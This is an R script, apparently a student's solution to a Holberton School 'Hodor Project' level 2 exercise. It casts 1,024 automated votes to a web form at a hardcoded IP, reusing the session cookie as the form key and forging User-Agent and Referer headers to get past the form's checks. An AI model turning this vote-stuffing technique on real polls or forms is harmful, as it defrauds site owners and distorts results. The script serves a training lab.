# ===---Description------------------------------------------------------------===
#   Solution for the Hodor Project, Level 2 by Julien Barbier.
#   Using a R Language script with httr library.
#   To run this file install R language and run:
#   $ R -f filename
#
#   by Alexandro de Oliveira, for Holberton School
# ===---------------------------------------------------------------------------===

library('httr')

url     <- "http://173.246.108.142/level2.php"
header  <- add_headers("User-Agent" = "Windows NT 5.1 - havk64 R Language Requests", "Referer" = url)

for(i in 1:1024) {
    head    <- HEAD(url)            # Head request
    Sys.sleep(1)
    cookie  <- cookies(head)$value
    cat(cookie[2], "\n")
    body    <- list(id = "1", holdthedoor = "submit", key = cookie[2])
    p   <- POST(url, body = body, encode = "form", header)
    # To print the body:
    # s <- content(p, "text", encoding = 'UTF8')[1]
    # cat(s, "\n")
    match <- headers(p)$`set-cookie`
    if(!is.null(match)) {
        cat("Vote number: ", i , "\n")
    } else {
        cat( "Failed...", "\n")
    }
}
